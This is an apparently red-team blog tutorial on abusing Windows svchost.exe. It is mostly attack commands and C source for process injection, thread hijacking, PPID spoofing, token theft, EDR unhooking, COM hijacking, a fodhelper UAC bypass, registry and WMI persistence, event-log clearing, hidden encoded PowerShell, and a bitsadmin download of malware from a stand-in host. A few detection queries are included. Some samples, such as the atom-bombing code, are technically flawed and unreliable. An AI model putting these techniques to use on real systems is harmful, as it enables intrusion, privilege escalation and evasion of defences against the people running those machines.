---
layout: post
title:  "Abuse SVCHost Methods(RTC0017)"
author: redteamrecipe
categories: [ tutorial ]
tags: [red, blue]
image: assets/images/31.jpg
description: "Abuse SVCHost Methods"
featured: true
hidden: true
rating: 4.5
---




`svchost.exe`, which stands for "Service Host", is an integral part of the Windows operating system. It's a generic host process name for services that run from dynamic-link libraries (DLLs). Instead of having a unique executable for each service, Windows uses `svchost.exe` to host multiple services in a single process.

#### **Why does Windows use svchost.exe?**

1. **Memory Efficiency**: Running multiple services within a single process can save memory because each individual service doesn't need its own process overhead.
    
2. **Modularity**: By separating services into DLLs, developers can easily write and update individual services without affecting others.
    
3. **Security and Isolation**: Services can be grouped by their isolation and security requirements. For instance, services that require similar security contexts can be grouped into a single `svchost.exe` instance.
    

### **Attack Surface**

Given its critical role and the fact that it often runs with elevated privileges, `svchost.exe` is an attractive target for attackers. Here are some reasons why:

1. **Blending in with Legitimate Activity**: Since `svchost.exe` is a legitimate Windows process, malicious activities associated with it can easily blend in, making detection more challenging.
    
2. **Elevated Privileges**: Many services within `svchost.exe` run with high or system-level privileges. If an attacker can inject malicious code into `svchost.exe`, they can potentially gain elevated privileges on the system.
    
3. **Hosting Multiple Services**: If an attacker can compromise one service within `svchost.exe`, they might be able to influence or attack other services within the same process.
    

### **Common Attack Vectors**

1. **DLL Injection**: Since `svchost.exe` hosts services from DLLs, attackers often target it for DLL injection attacks, where a malicious DLL is loaded into its process space.
    
2. **Impersonation**: Attackers can impersonate `svchost.exe` to hide malicious processes or activities.
    
3. **Memory Manipulation**: Techniques like process hollowing can be used to replace the legitimate code of `svchost.exe` with malicious code.
    
4. **Service Configuration Manipulation**: Attackers can modify service configurations to force `svchost.exe` to load a malicious DLL or execute malicious commands.



![svchost abuse](/assets/images/svc_mindmap.png)



### **Important Function to Abuse Svchost**



![svchost abuse](/assets/images/cpp-svchost-abuse.png)



### DLL Injection

Injecting a malicious DLL into svchost


![svchost abuse](/assets/images/1.png)


```
injector.exe -p svchost.exe -d malicious.dll
```


https://github.com/monoxgas/sRDI

### Unauthorized Network Connection

findstr svchost


![svchost abuse](/assets/images/2.png)


```
netstat -anob
```




### Process Impersonation

Mimikatz impersonation of svchost


![svchost abuse](/assets/images/3.png)


```
mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords"
```




### Memory Dump

Dumping svchost memory


![svchost abuse](/assets/images/4.png)


```
procdump.exe -ma svchost.exe dumpfile.dmp
```





### Unauthorized File Creation

Copying malicious file as svchost


![svchost abuse](/assets/images/5.png)


```
copy malicious.exe C:\Windows\System32\svchost.exe
```





### Process Hollowing

Hollowing svchost to run malicious code


![svchost abuse](/assets/images/6.png)



```
hollow.exe svchost.exe malicious.exe
```



https://github.com/boku7/HOLLOW


### Process Doppelganging

Using doppelganging technique on svchost


![svchost abuse](/assets/images/7.png)


```
doppel.exe svchost.exe malicious.bin
```




https://github.com/Spajed/processrefund

### Reflective DLL Injection

Injecting DLL into svchost without touching disk



![svchost abuse](/assets/images/8.png)


```
reflective_injector.exe svchost.exe malicious.dll
```



https://github.com/stephenfewer/ReflectiveDLLInjection


### Thread Execution Hijacking

Hijacking svchost thread execution


![svchost abuse](/assets/images/9.png)


```
hijack.exe svchost.exe
```


Thread Execution Hijacking is a technique where an attacker suspends a thread within a process and modifies its instruction pointer (typically the EIP register on x86 architectures) to point to malicious code. Once the thread is resumed, it will execute the malicious code.

```
#include <windows.h>
#include <stdio.h>

// Simple payload that shows a message box
void payload() {
    MessageBox(NULL, "Thread hijacked!", "Payload", MB_OK);
    ExitThread(0); // Exit the thread after executing the payload
}

int main() {
    DWORD processId = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    // Find the process ID of notepad.exe
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (strcmp(pe.szExeFile, "notepad.exe") == 0) {
                processId = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);

    if (processId == 0) {
        printf("notepad.exe not found.\n");
        return 1;
    }

    // Open the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processId);
    if (!hProcess) {
        printf("Failed to open target process.\n");
        return 1;
    }

    // Allocate memory in the target process for our payload
    LPVOID pRemoteCode = VirtualAllocEx(hProcess, NULL, 1024, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!pRemoteCode) {
        printf("Memory allocation failed.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Write our payload to the target process
    WriteProcessMemory(hProcess, pRemoteCode, payload, 1024, NULL);

    // Create a thread in the target process to execute our payload
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)pRemoteCode, NULL, 0, NULL);
    if (!hThread) {
        printf("Thread creation failed.\n");
        VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    VirtualFreeEx(hProcess, pRemoteCode, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}
```

### Parent PID Spoofing

Spoofing parent process ID for svchost


![svchost abuse](/assets/images/10.png)



```
ppid_spoof.exe svchost.exe
```



Parent Process ID (PPID) spoofing is a technique where an attacker launches a process with a different parent process than the one that actually spawned it. This can be used to bypass security checks, as some security solutions might trust child processes of specific trusted parent processes.

One way to achieve PPID spoofing is by using the `CreateProcess` function with the `STARTUPINFOEX` structure and `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute. Here's an educational example in C that demonstrates this concept:

```
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD targetPID; // The PID of the process you want to spoof as the parent
    printf("Enter the target PID to spoof as parent: ");
    scanf("%d", &targetPID);

    HANDLE hTargetProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetPID);
    if (!hTargetProcess) {
        printf("Failed to open target process.\n");
        return 1;
    }

    SIZE_T size;
    STARTUPINFOEX siex = { sizeof(siex) };
    PROCESS_INFORMATION pi;

    // Set up the attribute list for the parent process spoofing
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    siex.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, size);
    InitializeProcThreadAttributeList(siex.lpAttributeList, 1, 0, &size);

    // Set the parent process to the target process
    UpdateProcThreadAttribute(siex.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hTargetProcess, sizeof(HANDLE), NULL, NULL);

    // Create the child process (e.g., svchost.exe)
    if (!CreateProcess("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, EXTENDED_STARTUPINFO_PRESENT, NULL, NULL, (LPSTARTUPINFO)&siex, &pi)) {
        printf("Failed to create child process.\n");
        HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
        CloseHandle(hTargetProcess);
        return 1;
    }

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    HeapFree(GetProcessHeap(), 0, siex.lpAttributeList);
    CloseHandle(hTargetProcess);

    return 0;
}
=
```


### Token Manipulation

Manipulating svchost process tokens

```
token_manip.exe svchost.exe
```


Token manipulation is a technique where an attacker duplicates a token from a high-privileged process and then uses that token to launch a new process with elevated privileges. This is often used in privilege escalation attacks.

```
#include <windows.h>
#include <stdio.h>

int main() {
    HANDLE hToken, hNewToken, hProcess;
    DWORD processID;

    // Assuming you've already obtained the PID of svchost.exe or any high-privileged process
    printf("Enter the PID of the high-privileged process (e.g., svchost.exe): ");
    scanf("%d", &processID);

    // Open the target process
    hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, processID);
    if (!hProcess) {
        printf("Failed to open target process.\n");
        return 1;
    }

    // Get the process token
    if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hToken)) {
        printf("Failed to obtain process token.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Duplicate the token
    if (!DuplicateTokenEx(hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hNewToken)) {
        printf("Failed to duplicate token.\n");
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Use the duplicated token to run a new process with elevated privileges
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi;
    if (!CreateProcessWithTokenW(hNewToken, 0, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi)) {
        printf("Failed to create process with elevated token.\n");
        CloseHandle(hNewToken);
        CloseHandle(hToken);
        CloseHandle(hProcess);
        return 1;
    }

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hNewToken);
    CloseHandle(hToken);
    CloseHandle(hProcess);

    return 0;
}
```


### Unhooking

Unhooking svchost from security modules

```
unhook.exe svchost.exe
```



Unhooking refers to the process of restoring the original bytes of a function that has been hooked (i.e., its behavior has been altered, often by security software or malware). By unhooking a function, you can bypass monitoring or other security mechanisms that rely on these hooks.

```
#include <windows.h>
#include <stdio.h>

// This is a simple representation of the first few bytes of the MessageBoxW function
// in its original state. This might vary based on the Windows version and updates.
unsigned char originalBytes[] = { 0x8B, 0xFF, 0x55, 0x8B, 0xEC };

int main() {
    HMODULE hUser32 = GetModuleHandleA("user32.dll");
    if (!hUser32) {
        printf("Failed to get handle to user32.dll.\n");
        return 1;
    }

    // Get the address of MessageBoxW
    FARPROC pMessageBoxW = GetProcAddress(hUser32, "MessageBoxW");
    if (!pMessageBoxW) {
        printf("Failed to get address of MessageBoxW.\n");
        return 1;
    }

    // Change memory protection to allow writing
    DWORD oldProtect;
    if (!VirtualProtect(pMessageBoxW, sizeof(originalBytes), PAGE_EXECUTE_READWRITE, &oldProtect)) {
        printf("Failed to change memory protection.\n");
        return 1;
    }

    // Overwrite the beginning of MessageBoxW with the original bytes
    memcpy(pMessageBoxW, originalBytes, sizeof(originalBytes));

    // Restore the original memory protection
    VirtualProtect(pMessageBoxW, sizeof(originalBytes), oldProtect, &oldProtect);

    printf("Unhooked MessageBoxW successfully.\n");

    // Test the unhooked function
    MessageBoxW(NULL, L"Unhooked MessageBox", L"Test", MB_OK);

    return 0;
}
```


### Code Injection

code_inject.exe svchost.exe

```
Injecting malicious code into svchost
```


Code injection is a technique where an attacker injects malicious code into a running process. This can be done for various purposes, such as executing arbitrary code with the privileges of the target process, evading detection, or bypassing security mechanisms.

```
#include <windows.h>
#include <stdio.h>

int main() {
    DWORD processID;
    HANDLE hProcess;
    LPVOID remoteBuffer;
    char code[] = {
        // ... Your shellcode goes here ...
    };

    // Assuming you've already obtained the PID of svchost.exe
    printf("Enter the PID of svchost.exe: ");
    scanf("%d", &processID);

    // Open the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        printf("Failed to open target process.\n");
        return 1;
    }

    // Allocate memory in the target process
    remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(code), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        printf("Failed to allocate memory in target process.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Write the code into the target process
    if (!WriteProcessMemory(hProcess, remoteBuffer, code, sizeof(code), NULL)) {
        printf("Failed to write to target process memory.\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread to execute the code
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hThread) {
        printf("Failed to create remote thread in target process.\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Cleanup
    CloseHandle(hThread);
    VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
    CloseHandle(hProcess);

    printf("Code injected successfully.\n");
    return 0;
}
```


### Process Reimaging

Reimaging svchost to hide malicious activities

```
reimage.exe svchost.exe
```



Process reimaging is a technique used to manipulate the image path or command line of a running process in memory. This can be used to hide malicious activities by making a malicious process appear as a legitimate one, such as `svchost.exe`.

```
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

// Define the structure for process parameters
typedef struct _RTL_USER_PROCESS_PARAMETERS {
    BYTE Reserved1[16];
    PVOID Reserved2[10];
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
} RTL_USER_PROCESS_PARAMETERS, *PRTL_USER_PROCESS_PARAMETERS;

// Define the structure for process basic information
typedef struct _PROCESS_BASIC_INFORMATION {
    PVOID Reserved1;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
    BYTE Reserved2[104];
    PVOID Reserved3[5];
    ULONG_PTR PEBBaseAddress;
} PROCESS_BASIC_INFORMATION, *PPROCESS_BASIC_INFORMATION;

int main() {
    DWORD processID;
    HANDLE hProcess;
    PROCESS_BASIC_INFORMATION pbi;
    ULONG returnLength;

    // Function pointer for NtQueryInformationProcess
    typedef NTSTATUS (WINAPI *pNtQueryInformationProcess)(HANDLE, PROCESSINFOCLASS, PVOID, ULONG, PULONG);
    pNtQueryInformationProcess NtQueryInformationProcess;

    // Load ntdll and get the address of NtQueryInformationProcess
    NtQueryInformationProcess = (pNtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtQueryInformationProcess");
    if (!NtQueryInformationProcess) {
        printf("Failed to get address of NtQueryInformationProcess.\n");
        return 1;
    }

    // Assuming you've already obtained the PID of the target process
    printf("Enter the PID of the target process: ");
    scanf("%d", &processID);

    // Open the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        printf("Failed to open target process.\n");
        return 1;
    }

    // Get the process basic information
    NTSTATUS status = NtQueryInformationProcess(hProcess, 0, &pbi, sizeof(pbi), &returnLength);
    if (status != 0) {
        printf("Failed to query process information.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Modify the ImagePathName to mimic svchost.exe
    UNICODE_STRING fakeImagePath;
    fakeImagePath.Buffer = L"C:\\Windows\\System32\\svchost.exe";
    fakeImagePath.Length = wcslen(fakeImagePath.Buffer) * 2;
    fakeImagePath.MaximumLength = (wcslen(fakeImagePath.Buffer) * 2) + 2;

    if (!WriteProcessMemory(hProcess, &pbi.ProcessParameters->ImagePathName, &fakeImagePath, sizeof(fakeImagePath), NULL)) {
        printf("Failed to modify ImagePathName.\n");
        CloseHandle(hProcess);
        return 1;
    }

    printf("Successfully reimaged the process.\n");

    // Cleanup
    CloseHandle(hProcess);
    return 0;
}
```


### ATOM Bombing

Using ATOM tables to inject code into svchost

```
atom_bomb.exe svchost.exe
```



https://github.com/BreakingMalwareResearch/atom-bombing

ATOM Bombing is a code injection technique that leverages the global ATOM table, a feature provided by Windows for storing strings and corresponding identifiers. An attacker can use the ATOM table to write malicious code and then force a legitimate process to retrieve and execute it.

```
#include <windows.h>
#include <stdio.h>

int main() {
    ATOM atom;
    DWORD processID;
    HANDLE hProcess;
    HANDLE hThread;
    LPVOID remoteBuffer;

    // Sample shellcode for demonstration purposes
    char shellcode[] = {
        // ... Your shellcode goes here ...
    };

    // Register the shellcode in the global ATOM table
    atom = GlobalAddAtomA(shellcode);
    if (!atom) {
        printf("Failed to add shellcode to ATOM table.\n");
        return 1;
    }

    // Assuming you've already obtained the PID of svchost.exe
    printf("Enter the PID of svchost.exe: ");
    scanf("%d", &processID);

    // Open the target process
    hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processID);
    if (!hProcess) {
        printf("Failed to open target process.\n");
        return 1;
    }

    // Allocate memory in the target process
    remoteBuffer = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!remoteBuffer) {
        printf("Failed to allocate memory in target process.\n");
        CloseHandle(hProcess);
        return 1;
    }

    // Force the target process to retrieve the shellcode from the ATOM table
    if (!SendMessageA(HWND_BROADCAST, WM_GETTEXT, sizeof(shellcode), (LPARAM)remoteBuffer)) {
        printf("Failed to send message to target process.\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Create a remote thread in the target process to execute the shellcode
    hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
    if (!hThread) {
        printf("Failed to create remote thread in target process.\n");
        VirtualFreeEx(hProcess, remoteBuffer, 0, MEM_RELEASE);
        CloseHandle(hProcess);
        return 1;
    }

    // Cleanup
    GlobalDeleteAtom(atom);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    printf("ATOM Bombing successful.\n");
    return 0;
}
```


### Window Message Hooking

Hooking window messages to control svchost

```
hookmsg.exe svchost.exe
```




Window Message Hooking involves intercepting and possibly modifying window messages in the system. One common method to achieve this is by using the `SetWindowsHookEx` function provided by the Windows API. This function allows you to set a hook procedure to monitor the system for certain types of messages before they reach the target window procedure.

```
#include <windows.h>
#include <stdio.h>

// Global variables
HINSTANCE hInstance;
HHOOK hHook;

// Hook procedure
LRESULT CALLBACK MessageHookProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0) {
        // Intercept messages here
        MSG *msg = (MSG *)lParam;
        if (msg->message == WM_SOME_MESSAGE) { // Replace WM_SOME_MESSAGE with a real message identifier
            // Handle or modify the message
            printf("Intercepted a window message!\n");
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

BOOL SetHook() {
    hHook = SetWindowsHookEx(WH_GETMESSAGE, MessageHookProc, hInstance, 0);
    return (hHook != NULL);
}

BOOL UnsetHook() {
    return UnhookWindowsHookEx(hHook);
}

int main() {
    hInstance = GetModuleHandle(NULL);

    if (!SetHook()) {
        printf("Failed to set hook.\n");
        return 1;
    }

    printf("Hook set successfully. Press any key to unhook...\n");
    getchar();

    if (!UnsetHook()) {
        printf("Failed to unset hook.\n");
        return 1;
    }

    printf("Hook unset successfully.\n");
    return 0;
}
```


### COM Hijacking

Hijacking COM objects to control svchost

```
com_hijack.exe svchost.exe
```



COM (Component Object Model) Hijacking is a persistence technique where an attacker manipulates registry entries to redirect or intercept calls to legitimate COM objects. This can be used to execute malicious code when a specific COM object is invoked.

```
#include <windows.h>
#include <stdio.h>

// CLSID of a legitimate COM object (for demonstration purposes only)
// You should replace this with a real CLSID
#define TARGET_CLSID L"{12345678-1234-1234-1234-123456789012}"

// Path to the malicious DLL that will be invoked instead of the legitimate COM object
#define MALICIOUS_DLL_PATH L"C:\\path\\to\\malicious.dll"

BOOL SetCOMHijack() {
    HKEY hKey;
    LONG lResult;
    WCHAR szKeyPath[256];

    // Construct the registry key path
    wsprintf(szKeyPath, L"Software\\Classes\\CLSID\\%s\\InprocServer32", TARGET_CLSID);

    // Open or create the registry key
    lResult = RegCreateKeyEx(HKEY_CURRENT_USER, szKeyPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL);
    if (lResult != ERROR_SUCCESS) {
        return FALSE;
    }

    // Set the default value to the path of the malicious DLL
    lResult = RegSetValueEx(hKey, NULL, 0, REG_SZ, (const BYTE*)MALICIOUS_DLL_PATH, (wcslen(MALICIOUS_DLL_PATH) + 1) * sizeof(WCHAR));
    RegCloseKey(hKey);

    return (lResult == ERROR_SUCCESS);
}

int main() {
    if (SetCOMHijack()) {
        printf("COM Hijacking set successfully.\n");
    } else {
        printf("Failed to set COM Hijacking.\n");
    }
    return 0;
}
```

### Dynamic Data Exchange

Using DDE to execute commands via svchost

```
dde_attack.exe svchost.exe
```



Dynamic Data Exchange (DDE) is an older interprocess communication system that allows two running applications to share the same data. DDE can be abused to execute arbitrary commands, and it has been used in the past as a method for command execution in Microsoft Office documents.

```
#include <windows.h>
#include <stdio.h>

int main() {
    // DDE requires a window to be created for message handling
    HWND hwnd = CreateWindowEx(0, "STATIC", "DDE Command Execution", 0, 0, 0, 0, 0, HWND_MESSAGE, NULL, NULL, NULL);
    if (!hwnd) {
        printf("Failed to create window for DDE.\n");
        return 1;
    }

    // Initialize DDE
    UINT uDDEInit = DdeInitialize(NULL, NULL, APPCLASS_STANDARD | APPCMD_CLIENTONLY, 0);
    if (uDDEInit != DMLERR_NO_ERROR) {
        printf("Failed to initialize DDE.\n");
        return 1;
    }

    // Connect to a DDE service (e.g., Excel)
    HSZ hszService = DdeCreateStringHandle(uDDEInit, "Excel", CP_WINANSI);
    HSZ hszTopic = DdeCreateStringHandle(uDDEInit, "System", CP_WINANSI);
    HCONV hConv = DdeConnect(uDDEInit, hszService, hszTopic, NULL);

    if (!hConv) {
        printf("Failed to connect to DDE service.\n");
        DdeUninitialize(uDDEInit);
        return 1;
    }

    // Execute a command via DDE (for demonstration purposes, let's open Calculator)
    HSZ hszCommand = DdeCreateStringHandle(uDDEInit, "[EXEC(\"calc.exe\")]", CP_WINANSI);
    if (!DdeClientTransaction(NULL, 0, hConv, hszCommand, CF_TEXT, XTYP_EXECUTE, TIMEOUT_ASYNC, NULL)) {
        printf("Failed to execute DDE command.\n");
    }

    // Cleanup
    DdeFreeStringHandle(uDDEInit, hszService);
    DdeFreeStringHandle(uDDEInit, hszTopic);
    DdeFreeStringHandle(uDDEInit, hszCommand);
    DdeDisconnect(hConv);
    DdeUninitialize(uDDEInit);
    DestroyWindow(hwnd);

    return 0;
}
```


### PowerShell Injection

Injecting PowerShell commands via svchost

```
powershell -encodedCommand [Base64Code]
```




### Environment Variable Override

Overriding environment variables to affect svchost behavior

```
set COMPLUS_Version=v4.0.30319 && svchost.exe
```

```
process.name: "cmd.exe" AND process.args: "set" AND process.args: "COMPLUS_Version"
```



### Image File Execution Options Injection

Manipulating IFEO to debug svchost with malicious code

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\svchost.exe" /v Debugger /t REG_SZ /d "malicious.exe"
```

```
process.name: "reg.exe" AND process.args: "Image File Execution Options" AND process.args: "svchost.exe"
```



### WMI Event Subscription

Creating malicious WMI event subscriptions

```
wmic /namespace:\\root\subscription PATH __EventFilter CREATE Name="evilFilter", EventNameSpace="root\cimv2", QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325"
```





### ETW Provider Hijacking

Hijacking ETW providers to monitor svchost

```
etw_hijack.exe svchost.exe
```



Event Tracing for Windows (ETW) is a powerful tracing facility provided by Windows for logging and monitoring system and application behavior. ETW providers are components that generate events to be traced. Hijacking or abusing ETW providers can allow an attacker to monitor specific events, potentially gaining insights into system behavior or user actions.

```
#include <windows.h>
#include <evntcons.h>
#include <evntrace.h>

// Callback for processing events
void WINAPI EventRecordCallback(EVENT_RECORD* pEventRecord) {
    if (pEventRecord->EventHeader.EventDescriptor.Id == 10 /* Process Start Event ID */) {
        // Extract process name and check if it's svchost.exe
        // This is a simplification; in a real-world scenario, you'd need to parse the event data
        if (strstr((char*)pEventRecord->UserData, "svchost.exe")) {
            printf("svchost.exe started!\n");
        }
    }
}

int main() {
    TRACEHANDLE hTrace = 0;
    EVENT_TRACE_LOGFILE traceLog = { 0 };
    traceLog.LoggerName = KERNEL_LOGGER_NAME;
    traceLog.ProcessTraceMode = PROCESS_TRACE_MODE_REAL_TIME;
    traceLog.EventRecordCallback = (PEVENT_RECORD_CALLBACK)EventRecordCallback;

    hTrace = OpenTrace(&traceLog);
    if (hTrace == INVALID_PROCESSTRACE_HANDLE) {
        printf("Failed to open trace.\n");
        return 1;
    }

    ULONG status = ProcessTrace(&hTrace, 1, 0, 0);
    if (status != ERROR_SUCCESS) {
        printf("Failed to process trace.\n");
        CloseTrace(hTrace);
        return 1;
    }

    CloseTrace(hTrace);
    return 0;
}
```


### AppInit_DLLs Injection

Injecting malicious DLLs via AppInit_DLLs registry key

```
reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows" /v AppInit_DLLs /t REG_SZ /d "malicious.dll"
```

```
process.name: "reg.exe" AND process.args: "AppInit_DLLs"
```



### Global Flags Override

Overriding global flags to debug svchost

```
gflags.exe /p /enable svchost.exe /full
```



```
#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    DWORD dwFlags = 0x2;  // FLG_HEAP_ENABLE_TAIL_CHECK, as an example

    // Open the Image File Execution Options key for svchost.exe
    if (RegOpenKeyEx(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\svchost.exe", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        printf("Failed to open registry key.\n");
        return 1;
    }

    // Set the global flag
    if (RegSetValueEx(hKey, "GlobalFlag", 0, REG_DWORD, (BYTE*)&dwFlags, sizeof(dwFlags)) != ERROR_SUCCESS) {
        printf("Failed to set GlobalFlag.\n");
        RegCloseKey(hKey);
        return 1;
    }

    printf("GlobalFlag set successfully for svchost.exe.\n");

    // Cleanup
    RegCloseKey(hKey);
    return 0;
}
```


### Registry Persistence

Adding persistence via registry to run malicious svchost on startup

```
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "MaliciousService" /t REG_SZ /d "svchost.exe -k netsvcs -p malicious.dll"
```

```
process.name: "reg.exe" AND process.args: "CurrentVersion\Run" AND process.args: "svchost.exe"
```



### Service Hijacking

Creating a malicious service using svchost

```
sc create MaliciousService binPath= "svchost.exe -k netsvcs -p malicious.dll"
```





### Scheduled Task Abuse

Creating a scheduled task to run malicious svchost

```
schtasks /create /tn "MaliciousTask" /tr "svchost.exe -k netsvcs -p malicious.dll"
```





### Event Log Tampering

Clearing event logs to hide svchost abuse

```
wevtutil cl System
```





### Fileless Malware Execution

Executing fileless malware via PowerShell in svchost context

```
powershell.exe -nop -w hidden -encodedCommand [Base64Code]
```






### Alternate Data Stream Execution

Executing malware from alternate data streams under svchost name

```
cmd.exe /c start svchost.exe:malicious.exe
```






### BITS Job Abuse

Using BITS to download malware as svchost

```
bitsadmin /create /download /priority foreground MaliciousJob http://malicious.com/malware.exe C:\Windows\System32\svchost_malware.exe
```





### UAC Bypass

Bypassing UAC to elevate svchost privileges

```
fodhelper.exe
```



Bypassing User Account Control (UAC) is a common technique used by malware to elevate privileges without prompting the user. There are numerous methods to bypass UAC, and many of them exploit specific behaviors or vulnerabilities in Windows components. One well-known method involves leveraging the `fodhelper.exe` binary, which is a part of Windows Features on Demand.

```
#include <windows.h>
#include <stdio.h>

int main() {
    HKEY hKey;
    char cmd[] = "C:\\Windows\\System32\\cmd.exe";  // Command to be executed with elevated privileges

    // Create a registry key to hijack the fodhelper.exe behavior
    if (RegCreateKeyEx(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) != ERROR_SUCCESS) {
        printf("Failed to create registry key.\n");
        return 1;
    }

    // Set the default value of the key to the command we want to execute
    if (RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, sizeof(cmd)) != ERROR_SUCCESS) {
        printf("Failed to set registry value.\n");
        RegCloseKey(hKey);
        return 1;
    }

    // Execute fodhelper.exe, which will now launch our command with elevated privileges
    system("C:\\Windows\\System32\\fodhelper.exe");

    // Cleanup: Remove the registry key to restore original behavior
    RegDeleteKey(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\shell\\open\\command");

    printf("UAC bypass attempted using fodhelper.exe.\n");
    return 0;
}
```


### DLL Search Order Hijacking

Placing malicious DLL in system directory to hijack svchost DLL loading

```
copy malicious.dll C:\Windows\System32\
```




### Malicious Script Execution

Executing malicious VBS script to abuse svchost

```
cscript.exe malicious.vbs
```



Executing a malicious VBS script typically involves leveraging Windows Script Host (`cscript.exe` or `wscript.exe`) to run the script. Here's a basic educational example in C that demonstrates the concept of executing a VBS script:

```
#include <windows.h>
#include <stdio.h>

int main() {
    STARTUPINFO si;
    PROCESS_INFORMATION pi;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    ZeroMemory(&pi, sizeof(pi));

    // Path to the malicious VBS script
    char scriptPath[] = "C:\\path\\to\\malicious.vbs";

    // Construct the command to execute the VBS script using cscript.exe
    char command[256];
    snprintf(command, sizeof(command), "cscript.exe %s", scriptPath);

    // Execute the VBS script
    if (!CreateProcess(NULL, command, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
        printf("Failed to execute script. Error: %d\n", GetLastError());
        return 1;
    }

    // Wait for the script to complete
    WaitForSingleObject(pi.hProcess, INFINITE);

    // Cleanup
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    printf("Script executed successfully.\n");
    return 0;
}
```




Cover By Sylvain Sarrailh
